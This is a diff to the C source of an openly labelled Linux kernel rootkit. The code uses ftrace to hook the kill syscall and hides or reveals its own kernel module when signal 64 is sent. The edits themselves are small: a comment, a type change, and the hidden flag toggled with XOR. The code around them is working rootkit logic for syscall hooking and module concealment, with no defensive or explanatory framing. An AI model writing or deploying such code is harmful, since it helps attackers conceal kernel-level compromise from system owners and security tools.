@@ -32,7 +32,7 @@ static int fh_resolve_hook_address(struct ftrace_hook *hook){
 static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs){
     struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
 
-    if(!within_module(parent_ip, THIS_MODULE))
+    if(!within_module(parent_ip, THIS_MODULE)) // parent_ip:contains the return address to the function that called the hooked one.
         regs->ip = (unsigned long) hook->function;
 }
 #else
@@ -127,7 +127,7 @@ static void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
 }
 
 
-static unsigned short hidden=0;
+static unsigned char hidden=0;
 static asmlinkage long (*orig_kill)(const struct pt_regs *);
 asmlinkage int hook_kill(const struct pt_regs *regs)
 {
@@ -138,13 +138,13 @@ asmlinkage int hook_kill(const struct pt_regs *regs)
     {
         printk(KERN_INFO "rootkit: hiding rootkit kernel module...\n");
         hideme();
-        hidden = 1;
+        hidden^= 1;
     }
     else if ( (sig == 64) && (hidden == 1) )
     {
         printk(KERN_INFO "rootkit: revealing rootkit kernel module...\n");
         showme();
-        hidden = 0;
+        hidden^=1;
     }
     else
     {
@@ -155,7 +155,7 @@ asmlinkage int hook_kill(const struct pt_regs *regs)
 
 static struct ftrace_hook hooks[] = {
     HOOK("__x64_sys_kill", hook_kill, &orig_kill),
-};
+}; // 
 
 int hook_syscall_init(void){
     int err;
